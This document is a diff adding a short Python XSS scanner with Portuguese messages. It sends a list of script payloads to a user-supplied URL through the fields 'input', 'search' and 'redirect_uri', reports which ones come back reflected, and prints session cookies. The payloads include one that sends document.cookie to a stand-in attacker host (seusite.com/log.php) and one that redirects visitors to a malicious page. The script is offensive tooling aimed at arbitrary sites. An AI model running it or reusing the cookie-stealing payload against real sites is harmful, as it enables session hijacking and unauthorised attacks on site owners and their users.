@@ -1,0 +1,29 @@
+import requests
+
+target = input("Entre com a URL do site: ")
+
+payloads = [
+    "<script>alert('XSS');</script>",
+    "<script>window.location.href = 'http://seusite.com/malicioso';</script>",
+    "<script>document.location = 'http://seusite.com/log.php?cookie=' + document.cookie;</script>",
+    "<img src='x' onerror='alert(\"XSS\")'>",
+    "<img src='x' onmouseover='alert(\"XSS\")'>"
+]
+
+params = ['input', 'search', 'redirect_uri']
+
+for param in params:
+    for payload in payloads:
+        data = {param: payload}
+        req = requests.post(target, data=data)
+
+        if payload in req.text:
+            print("Vulnerabilidade de XSS detectada!")
+            print("Payload: " + payload)
+            print("Parâmetro: " + param)
+            # Extrair e exibir o cookie de sessão
+            cookie = req.cookies.get_dict()
+            print("Cookie de sessão:", cookie)
+            print("---------------------------")
+        else:
+            print("Não foi detectada vulnerabilidade de XSS para o parâmetro:", param)
